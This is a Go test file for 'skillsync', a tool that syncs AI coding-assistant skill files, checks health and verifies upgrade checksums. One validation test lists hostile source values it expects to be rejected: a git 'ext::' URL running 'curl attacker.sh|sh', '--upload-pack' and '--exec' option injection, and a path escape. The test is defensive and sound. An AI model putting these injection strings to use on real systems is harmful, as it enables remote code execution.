package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

func writeSkill(t *testing.T, root, name, body string) string {
	t.Helper()
	dir := filepath.Join(root, name)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// Covers the SPEC §5/§10 decision table: install, up-to-date, managed drift
// overwrite, unmanaged identical adopt, unmanaged different skip.
func TestDirAdapterDecisionTable(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	stateMap := map[string]InstalledSkill{}
	a := adapters["claude-code"].(dirAdapter)

	dir := writeSkill(t, repo, "alpha", "v1")
	sk := Skill{Name: "alpha", Dir: dir, Source: "default"}

	verb, err := a.Install(sk, "", stateMap)
	if err != nil || verb != "installed" {
		t.Fatalf("fresh install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(claudeGlobalDir(), "alpha", "SKILL.md")); err != nil {
		t.Fatalf("skill not on disk: %v", err)
	}

	verb, err = a.Install(sk, "", stateMap)
	if err != nil || verb != "" {
		t.Fatalf("up-to-date: verb=%q err=%v", verb, err)
	}

	// Managed drift: local edit then upstream change, must overwrite (§5).
	installed := filepath.Join(claudeGlobalDir(), "alpha", "SKILL.md")
	os.WriteFile(installed, []byte("local hack"), 0o644)
	os.WriteFile(filepath.Join(dir, "SKILL.md"), []byte("v2"), 0o644)
	verb, err = a.Install(sk, "", stateMap)
	if err != nil || verb != "updated" {
		t.Fatalf("drift overwrite: verb=%q err=%v", verb, err)
	}
	got, _ := os.ReadFile(installed)
	if string(got) != "v2" {
		t.Fatalf("expected upstream content, got %q", got)
	}

	// Unmanaged identical → adopt (§10).
	betaDir := writeSkill(t, repo, "beta", "same")
	writeSkill(t, claudeGlobalDir(), "beta", "same")
	verb, err = a.Install(Skill{Name: "beta", Dir: betaDir, Source: "default"}, "", stateMap)
	if err != nil || verb != "adopted" {
		t.Fatalf("adopt: verb=%q err=%v", verb, err)
	}

	// Unmanaged different → skip with error, file untouched (§10).
	gammaDir := writeSkill(t, repo, "gamma", "upstream")
	writeSkill(t, claudeGlobalDir(), "gamma", "mine")
	_, err = a.Install(Skill{Name: "gamma", Dir: gammaDir, Source: "default"}, "", stateMap)
	if err == nil {
		t.Fatal("expected skip error for unmanaged differing skill")
	}
	got, _ = os.ReadFile(filepath.Join(claudeGlobalDir(), "gamma", "SKILL.md"))
	if string(got) != "mine" {
		t.Fatalf("unmanaged skill was modified: %q", got)
	}

	// Project scope lands under <root>/.claude/skills.
	proj := t.TempDir()
	verb, err = a.Install(sk, proj, map[string]InstalledSkill{})
	if err != nil || verb != "installed" {
		t.Fatalf("project install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(proj, ".claude", "skills", "alpha", "SKILL.md")); err != nil {
		t.Fatalf("project skill missing: %v", err)
	}
}

func TestDiscoverSkills(t *testing.T) {
	repo := t.TempDir()
	writeSkill(t, repo, "b-skill", "x")
	writeSkill(t, repo, "a-skill", "x")
	os.MkdirAll(filepath.Join(repo, ".git"), 0o755)
	skills, err := discoverSkills(repo)
	if err != nil {
		t.Fatal(err)
	}
	if len(skills) != 2 || skills[0].Name != "a-skill" || skills[1].Name != "b-skill" {
		t.Fatalf("unexpected: %+v", skills)
	}
}

func TestReadManifest(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, manifestName)
	os.WriteFile(path, []byte("# team skills\nskills:\n  - code-review\n  - deploy\nother: ignored\n"), 0o644)
	names, err := readManifest(path)
	if err != nil {
		t.Fatal(err)
	}
	if len(names) != 2 || names[0] != "code-review" || names[1] != "deploy" {
		t.Fatalf("unexpected: %v", names)
	}
	os.WriteFile(path, []byte("nothing: here\n"), 0o644)
	if _, err := readManifest(path); err == nil {
		t.Fatal("expected error for manifest without skills")
	}
}

// Cursor reads SKILL.md natively from ~/.cursor/skills, so the adapter copies
// rather than converting, and unlike the old rules-file version, global scope
// must actually produce files.
func TestCursorAdapterCopiesBothScopes(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	dir := writeSkill(t, repo, "cs", "---\nname: cs\ndescription: d\n---\nbody")
	sk := Skill{Name: "cs", Dir: dir, Source: "s"}
	a := adapters["cursor"].(dirAdapter)

	if verb, err := a.Install(sk, "", map[string]InstalledSkill{}); err != nil || verb != "installed" {
		t.Fatalf("global install: verb=%q err=%v", verb, err)
	}
	global := filepath.Join(home, ".cursor", "skills", "cs", "SKILL.md")
	if _, err := os.Stat(global); err != nil {
		t.Fatalf("cursor global skill missing: %v", err)
	}

	proj := t.TempDir()
	if verb, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil || verb != "installed" {
		t.Fatalf("project install: verb=%q err=%v", verb, err)
	}
	if _, err := os.Stat(filepath.Join(proj, ".cursor", "skills", "cs", "SKILL.md")); err != nil {
		t.Fatalf("cursor project skill missing: %v", err)
	}

	if err := a.Remove("cs", ""); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(global); !os.IsNotExist(err) {
		t.Fatal("cursor global skill not removed")
	}
}

// Codex reads .agents/skills, the cross-tool location; AGENTS.md is a separate
// mechanism and must not be touched.
func TestCodexAdapterUsesAgentsSkills(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	proj := t.TempDir()
	dir := writeSkill(t, repo, "cx", "---\nname: cx\ndescription: d\n---\nbody")
	sk := Skill{Name: "cx", Dir: dir, Source: "s"}
	a := adapters["codex"].(dirAdapter)

	existing := filepath.Join(proj, "AGENTS.md")
	os.WriteFile(existing, []byte("# My project notes\n"), 0o644)

	if _, err := a.Install(sk, "", map[string]InstalledSkill{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(home, ".agents", "skills", "cx", "SKILL.md")); err != nil {
		t.Fatalf("codex global skill missing: %v", err)
	}
	if _, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(proj, ".agents", "skills", "cx", "SKILL.md")); err != nil {
		t.Fatalf("codex project skill missing: %v", err)
	}
	got, _ := os.ReadFile(existing)
	if string(got) != "# My project notes\n" {
		t.Fatalf("AGENTS.md must not be modified, got:\n%s", got)
	}
}

func TestTrackAndStats(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	registerManaged(t, "my-skill")
	s := loadState()
	s.Installed["skillsync"] = InstalledSkill{Source: "builtin", Hash: "def"}
	saveJSON(statePath(), s)

	cmdTrack([]string{"my-skill"})
	cmdTrack([]string{"my-skill"})
	cmdTrack([]string{"local-only-skill"}) // hand-installed, not managed: dropped
	cmdTrack([]string{"skillsync"})        // built-in, not from the repo: dropped
	events := readEvents()
	if len(events) != 2 || events[0].Skill != "my-skill" || events[0].Tool != "claude-code" {
		t.Fatalf("unexpected events: %+v", events)
	}
}

// registerManaged marks skills as installed from a source repo in the current
// (test) HOME, so cmdTrack counts them.
func registerManaged(t *testing.T, names ...string) {
	t.Helper()
	s := loadState()
	for _, n := range names {
		s.Installed[n] = InstalledSkill{Source: "team", Hash: "h"}
	}
	if err := saveJSON(statePath(), s); err != nil {
		t.Fatal(err)
	}
}

func TestIsManagedSkillCoversProjectScope(t *testing.T) {
	s := &State{
		Installed:        map[string]InstalledSkill{},
		ProjectInstalled: map[string]map[string]InstalledSkill{"/proj": {"proj-skill": {Source: "team"}}},
	}
	if !isManagedSkill(s, "proj-skill") {
		t.Fatal("project-installed skill should be managed")
	}
	if isManagedSkill(s, "nope") {
		t.Fatal("unknown skill should not be managed")
	}
}

func TestNoEventsHintDependsOnHooks(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	if got := noEventsHint(); !strings.Contains(got, "hook install") || strings.Contains(got, "hooks are installed") {
		t.Fatalf("without hooks, hint should tell the user to install them, got %q", got)
	}
	cmdHook("install")
	if got := noEventsHint(); !strings.Contains(got, "hooks are installed") {
		t.Fatalf("with hooks, hint should not ask to install them again, got %q", got)
	}
}

func TestHookIdempotency(t *testing.T) {
	ss, _ := hookEntries()
	if hasSkillsyncHook(nil) {
		t.Fatal("empty list should not match")
	}
	if !hasSkillsyncHook([]any{ss}) {
		t.Fatal("skillsync entry should match")
	}
}

func TestFlushMetrics(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	registerManaged(t, "a", "b")
	cmdTrack([]string{"a"})
	var got []usageEvent
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		json.NewDecoder(r.Body).Decode(&got)
	}))
	defer srv.Close()
	prev := metricsClient
	metricsClient = srv.Client()
	defer func() { metricsClient = prev }()
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: srv.URL}})
	if len(got) != 1 || got[0].Skill != "a" {
		t.Fatalf("sink got %+v", got)
	}
	if _, err := os.Stat(eventsPath()); !os.IsNotExist(err) {
		t.Fatal("queue not cleared after successful flush")
	}
	// Failed flush keeps the queue.
	cmdTrack([]string{"b"})
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "https://127.0.0.1:1/nope"}})
	if len(readEvents()) != 1 {
		t.Fatal("queue lost on failed flush")
	}
}

func TestValidateSource(t *testing.T) {
	bad := []Source{
		{Name: "ok", URL: "ext::sh -c 'curl attacker.sh|sh'"},          // transport helper = code execution
		{Name: "ok", URL: "--upload-pack=/tmp/x"},                      // option injection
		{Name: "../../.claude/skills/code-review", URL: "https://x/y"}, // path escape
		{Name: ".hidden", URL: "https://x/y"},
		{Name: "ok", URL: "https://x/y", Pin: "--exec=evil"},
		{Name: "ok", URL: "notaurl"},
	}
	for _, src := range bad {
		if err := validateSource(src); err == nil {
			t.Errorf("expected rejection: %+v", src)
		}
	}
	good := []Source{
		{Name: "org", URL: "https://github.com/a/b.git"},
		{Name: "team", URL: "git@github.com:a/b.git", Pin: "v1.2.0"},
		{Name: "local", URL: "file:///tmp/x"},
		{Name: "ssh", URL: "ssh://git@host/a/b.git"},
	}
	for _, src := range good {
		if err := validateSource(src); err != nil {
			t.Errorf("expected accept %+v: %v", src, err)
		}
	}
}

func TestMetricsRequiresHTTPS(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	registerManaged(t, "secret-skill")
	cmdTrack([]string{"secret-skill"})
	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "http://metrics.internal/skills"}})
	if len(readEvents()) != 1 {
		t.Fatal("events should be kept, not shipped over cleartext http")
	}
}

func TestSubscriptionSemantics(t *testing.T) {
	all := &Config{}
	if !all.subscribed("anything") {
		t.Fatal("unset list means subscribe to everything")
	}
	none := &Config{GlobalSkills: &[]string{}}
	if none.subscribed("anything") {
		t.Fatal("explicitly emptied list must mean none")
	}
	one := &Config{GlobalSkills: &[]string{"code-review"}}
	if !one.subscribed("code-review") || one.subscribed("other") {
		t.Fatal("explicit list must be honored exactly")
	}
}

func TestAdapterRemove(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := t.TempDir()
	proj := t.TempDir()
	dir := writeSkill(t, repo, "gone", "---\nname: gone\ndescription: d\n---\nbody")
	sk := Skill{Name: "gone", Dir: dir, Source: "s"}

	for _, a := range []Adapter{adapters["claude-code"], adapters["cursor"], adapters["codex"]} {
		if _, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil {
			t.Fatal(err)
		}
		if err := a.Remove("gone", proj); err != nil && !os.IsNotExist(err) {
			t.Fatal(err)
		}
	}
	if _, err := os.Stat(filepath.Join(proj, ".claude", "skills", "gone")); !os.IsNotExist(err) {
		t.Fatal("claude skill not removed")
	}
	if _, err := os.Stat(filepath.Join(proj, ".cursor", "skills", "gone")); !os.IsNotExist(err) {
		t.Fatal("cursor skill not removed")
	}
	if _, err := os.Stat(filepath.Join(proj, ".agents", "skills", "gone")); !os.IsNotExist(err) {
		t.Fatal("codex skill not removed")
	}
}

func TestHookUninstallPreservesOtherHooks(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	// A user hook that must survive, alongside ours.
	saveJSON(claudeSettingsPath(), map[string]any{
		"model": "opus",
		"hooks": map[string]any{
			"SessionStart": []any{map[string]any{
				"hooks": []any{map[string]any{"type": "command", "command": "echo mine"}},
			}},
		},
	})
	cmdHook("install")
	cmdHook("uninstall")
	settings, ok := readClaudeSettings()
	if !ok {
		t.Fatal("settings file gone")
	}
	if settings["model"] != "opus" {
		t.Fatal("unrelated settings lost")
	}
	b, _ := json.Marshal(settings)
	if strings.Contains(string(b), "skillsync") {
		t.Fatalf("skillsync hooks not removed: %s", b)
	}
	if !strings.Contains(string(b), "echo mine") {
		t.Fatalf("user hook lost: %s", b)
	}
}

func TestLastChangedAndAge(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	home := t.TempDir()
	t.Setenv("HOME", home)
	repo := filepath.Join(reposDir(), "src")
	if err := os.MkdirAll(repo, 0o755); err != nil {
		t.Fatal(err)
	}
	dir := writeSkill(t, repo, "aged", "body")
	for _, args := range [][]string{
		{"init", "-q"},
		{"-c", "user.email=t@t", "-c", "user.name=Ada Lovelace", "add", "-A"},
		{"-c", "user.email=t@t", "-c", "user.name=Ada Lovelace", "commit", "-qm", "add skill"},
	} {
		cmd := exec.Command("git", args...)
		cmd.Dir = repo
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Skipf("git setup failed: %v: %s", err, out)
		}
	}
	when, who := lastChanged(Skill{Name: "aged", Dir: dir, Source: "src"})
	if when.IsZero() {
		t.Fatal("no commit time resolved")
	}
	if who != "Ada Lovelace" {
		t.Fatalf("author = %q", who)
	}
	if got := humanAge(when); got != "0m ago" {
		t.Fatalf("fresh commit rendered as %q", got)
	}
	if humanAge(time.Time{}) != "unknown" {
		t.Fatal("zero time should render as unknown")
	}
	if humanAge(time.Now().Add(-50*time.Hour)) != "2d ago" {
		t.Fatalf("50h rendered as %q", humanAge(time.Now().Add(-50*time.Hour)))
	}
}

// fakeDaemonInstalled writes whatever marker daemonInstalled() looks for on
// this platform, so the health tests run everywhere CI does rather than only
// on macOS.
func fakeDaemonInstalled(t *testing.T) {
	t.Helper()
	switch runtime.GOOS {
	case "darwin":
		if err := os.MkdirAll(filepath.Dir(launchdPlistPath()), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(launchdPlistPath(), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	case "linux":
		if err := os.MkdirAll(systemdUnitDir(), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(systemdUnitDir(), "skillsync.timer"), []byte("x"), 0o644); err != nil {
			t.Fatal(err)
		}
	default:
		t.Skip("no daemon marker to fake on " + runtime.GOOS)
	}
}

func TestHealthProblemDetection(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	now := time.Now().UTC()

	// No background job registered is the loudest problem.
	s := &State{Health: Health{LastSuccess: now}}
	if p := healthProblem(s); !strings.Contains(p, "no background job") {
		t.Fatalf("expected missing-daemon warning, got %q", p)
	}

	// With a job registered, a recent success is healthy...
	fakeDaemonInstalled(t)
	if p := healthProblem(&State{Health: Health{LastSuccess: now}}); p != "" {
		t.Fatalf("expected healthy, got %q", p)
	}
	// ...a stale success warns...
	stale := &State{Health: Health{LastSuccess: now.Add(-30 * time.Hour)}}
	if p := healthProblem(stale); !strings.Contains(p, "No successful sync") {
		t.Fatalf("expected staleness warning, got %q", p)
	}
	// ...and a failure after the last success reports the error.
	failing := &State{Health: Health{
		LastSuccess: now.Add(-time.Hour),
		LastAttempt: now,
		LastError:   "git clone: permission denied",
	}}
	if p := healthProblem(failing); !strings.Contains(p, "permission denied") {
		t.Fatalf("expected failure detail, got %q", p)
	}
}

func TestRecordSync(t *testing.T) {
	s := &State{}
	recordSync(s, fmt.Errorf("boom\nsecond line"))
	if s.Health.LastError != "boom second line" || !s.Health.LastSuccess.IsZero() {
		t.Fatalf("failure not recorded: %+v", s.Health)
	}
	recordSync(s, nil)
	if s.Health.LastError != "" || s.Health.LastSuccess.IsZero() {
		t.Fatalf("success did not clear the error: %+v", s.Health)
	}
}

func TestCheckIsSilentWhenHealthy(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	cmdCheck() // not initialized: must not panic or print
}

func TestParseTools(t *testing.T) {
	got, err := parseTools("")
	if err != nil || len(got) != 1 || got[0] != "claude-code" {
		t.Fatalf("empty flag should default to claude-code, got %v, %v", got, err)
	}
	got, err = parseTools(" cursor, codex ,cursor")
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || got[0] != "cursor" || got[1] != "codex" {
		t.Fatalf("expected [cursor codex] trimmed and deduplicated, got %v", got)
	}
	if _, err := parseTools("claude-code,vscode"); err == nil {
		t.Fatal("unknown tool must be rejected, sync would silently install into nothing")
	}
	if _, err := parseTools(" , "); err == nil {
		t.Fatal("explicitly empty --tools must be rejected")
	}
}

func TestBuiltinSkillHasLowestPrecedence(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	got, err := withBuiltin(nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Name != builtinSkillName || got[0].Source != builtinSource {
		t.Fatalf("empty resolve should yield only the built-in skill, got %+v", got)
	}
	if _, err := os.Stat(filepath.Join(got[0].Dir, "SKILL.md")); err != nil {
		t.Fatalf("built-in skill not materialized: %v", err)
	}

	team := Skill{Name: builtinSkillName, Dir: "/team/skills/skillsync", Source: "team"}
	got, err = withBuiltin([]Skill{team})
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 || got[0].Source != "team" {
		t.Fatalf("a team skill named skillsync must override the built-in, got %+v", got)
	}
}

// fakeRelease serves a GitHub-style latest-release API plus the asset and
// checksums for this platform, returning the server and the asset bytes.
func fakeRelease(t *testing.T, tag string, tamperChecksum bool) (*httptest.Server, []byte) {
	t.Helper()
	asset := []byte("#!/bin/sh\necho " + tag + "\n")
	sum := sha256.Sum256(asset)
	sumHex := hex.EncodeToString(sum[:])
	if tamperChecksum {
		sumHex = strings.Repeat("0", 64)
	}
	mux := http.NewServeMux()
	var srv *httptest.Server
	mux.HandleFunc("/releases/latest", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, `{"tag_name":%q,"assets":[{"name":%q,"browser_download_url":%q},{"name":"checksums.txt","browser_download_url":%q}]}`,
			tag, assetName(), srv.URL+"/asset", srv.URL+"/checksums.txt")
	})
	mux.HandleFunc("/asset", func(w http.ResponseWriter, r *http.Request) { w.Write(asset) })
	mux.HandleFunc("/checksums.txt", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "%s  %s\n%s  skillsync-other-arch\n", sumHex, assetName(), sumHex)
	})
	srv = httptest.NewTLSServer(mux)
	t.Cleanup(srv.Close)
	prevAPI, prevClient := releaseAPI, upgradeClient
	releaseAPI, upgradeClient = srv.URL+"/releases/latest", srv.Client()
	t.Cleanup(func() { releaseAPI, upgradeClient = prevAPI, prevClient })
	return srv, asset
}

func TestUpgradeReplacesBinaryAfterChecksum(t *testing.T) {
	_, asset := fakeRelease(t, "v9.9.9", false)
	target := filepath.Join(t.TempDir(), "skillsync")
	os.WriteFile(target, []byte("old"), 0o755)

	rel, err := latestRelease()
	if err != nil || rel.Tag != "v9.9.9" {
		t.Fatalf("latestRelease: %v %+v", err, rel)
	}
	if err := upgradeBinary(target, rel); err != nil {
		t.Fatal(err)
	}
	got, _ := os.ReadFile(target)
	if string(got) != string(asset) {
		t.Fatalf("binary not replaced: %q", got)
	}
	if _, err := os.Stat(target + ".new"); !os.IsNotExist(err) {
		t.Fatal("temp download left behind")
	}
}

func TestUpgradeRefusesBadChecksum(t *testing.T) {
	fakeRelease(t, "v9.9.9", true)
	target := filepath.Join(t.TempDir(), "skillsync")
	os.WriteFile(target, []byte("old"), 0o755)

	rel, _ := latestRelease()
	err := upgradeBinary(target, rel)
	if err == nil || !strings.Contains(err.Error(), "checksum mismatch") {
		t.Fatalf("expected checksum failure, got %v", err)
	}
	if got, _ := os.ReadFile(target); string(got) != "old" {
		t.Fatal("binary was replaced despite bad checksum")
	}
}

func TestUpgradeNotice(t *testing.T) {
	prev := version
	defer func() { version = prev }()

	version = "v0.1.0"
	s := &State{Update: UpdateInfo{Latest: "v0.2.0"}}
	if n := upgradeNotice(s); !strings.Contains(n, "v0.2.0") || !strings.Contains(n, "skillsync upgrade") {
		t.Fatalf("expected upgrade hint, got %q", n)
	}
	s.Update.Latest = "v0.1.0"
	if n := upgradeNotice(s); n != "" {
		t.Fatalf("up to date should be silent, got %q", n)
	}
	version = "dev"
	s.Update.Latest = "v0.2.0"
	if n := upgradeNotice(&State{}); n != "" {
		t.Fatalf("unknown latest should be silent, got %q", n)
	}
}

func TestRecordLatestVersionIsRateLimited(t *testing.T) {
	fakeRelease(t, "v9.9.9", false)
	s := &State{}
	recordLatestVersion(s)
	if s.Update.Latest != "v9.9.9" || s.Update.CheckedAt.IsZero() {
		t.Fatalf("first check should record: %+v", s.Update)
	}
	// Point the API at nothing; a recent check must not hit it.
	releaseAPI = "https://127.0.0.1:1/nope"
	s.Update.Latest = "v9.9.9"
	recordLatestVersion(s)
	if s.Update.Latest != "v9.9.9" {
		t.Fatal("re-checked within the rate limit window")
	}
}
